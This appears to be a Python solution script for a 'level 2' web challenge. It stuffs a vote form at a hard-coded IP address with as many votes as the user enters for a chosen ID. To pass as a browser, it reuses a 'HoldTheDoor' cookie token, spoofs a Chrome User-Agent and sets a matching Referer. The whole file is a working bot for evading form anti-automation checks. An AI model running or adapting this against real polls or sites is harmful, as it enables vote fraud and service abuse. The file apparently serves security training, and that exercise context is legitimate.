#!/usr/bin/python3
"""level 2"""
import requests


currentvote = 0
passed = 0
failed = 0
url = "http://158.69.76.135/level2.php"
headerwin = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 \
(KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36")
header = {"User-Agent": headerwin, "Referer": url}

try:
    ID = int(input("Input ID number: "))
except ValueError:
    print("PLEASE: input an integer")
    exit(1)
try:
    votes = int(input("Input number of votes: "))
except ValueError:
    print("PLEASE: input an integer")
    exit(1)

response = requests.get(url)

key = response.cookies["HoldTheDoor"]
mydata = {'id': ID, "holdthedoor": "Submit", "key": key}
cookie = {"HoldTheDoor": key}

for i in range(currentvote, votes):
    response = requests.post(url, mydata, cookies=cookie, headers=header)
    if response.status_code == 200:
            passed += 1
            print("{} Passed".format(passed), end='\r')
    else:
            failed += 1
            print("{} Failed".format(failed), end='\r')

print()
print("Passed {}, Failed {}".format(passed, failed))
